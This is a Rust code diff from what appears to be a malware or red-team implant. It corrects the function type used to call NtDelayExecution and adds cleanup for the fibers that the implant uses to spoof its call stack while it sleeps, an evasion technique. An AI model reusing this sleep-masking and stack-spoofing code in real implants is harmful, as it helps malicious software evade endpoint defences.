@@ -63,8 +63,10 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
                 if !addr.is_null() {
                     // Correct NtDelayExecution signature:
                     //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
-                    // Alertable is a signed 32-bit BOOLEAN (not u8), Interval is *mut i64.
-                    let function: extern "system" fn(i32, *mut i64) -> i32 =
+                    // BOOLEAN is a 1-byte unsigned integer (u8), NOT i32.
+                    // The previous i32 declaration only worked by x64 calling-
+                    // convention coincidence (H-4).
+                    let function: extern "system" fn(u8, *mut i64) -> i32 =
                         std::mem::transmute(addr);
                     function(0, &mut delay as *mut i64);
                     spoof::restore_stack();
@@ -434,9 +436,9 @@ pub mod crypto {
 pub mod spoof {
     // Thread-local state for fiber-based stack spoofing.
     thread_local! {
-        static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
+        pub(super) static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
             const { std::cell::Cell::new(std::ptr::null_mut()) };
-        static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
+        pub(super) static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
             const { std::cell::Cell::new(std::ptr::null_mut()) };
         static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
     }
@@ -521,4 +523,32 @@ pub mod spoof {
 
     #[cfg(not(windows))]
     pub fn restore_stack() {}
+}
+
+/// Release any fiber handles created by `spoof::spoof_stack` for the calling
+/// thread.  Must be called before the thread exits or before the agent shuts
+/// down to avoid leaking fiber memory (H-4).
+pub fn cleanup_fibers() {
+    #[cfg(windows)]
+    {
+        use winapi::um::winbase::{ConvertFiberToThread, DeleteFiber};
+        spoof::SLEEP_FIBER.with(|f| {
+            let handle = f.get();
+            if !handle.is_null() {
+                unsafe { DeleteFiber(handle) };
+                f.set(std::ptr::null_mut());
+            }
+        });
+        spoof::MAIN_FIBER.with(|f| {
+            let handle = f.get();
+            if !handle.is_null() {
+                // The main fiber was created by ConvertThreadToFiber, which
+                // makes the calling thread itself a fiber.  Release it via
+                // ConvertFiberToThread; DeleteFiber on the *current* fiber
+                // would terminate the thread.
+                unsafe { ConvertFiberToThread() };
+                f.set(std::ptr::null_mut());
+            }
+        });
+    }
 }
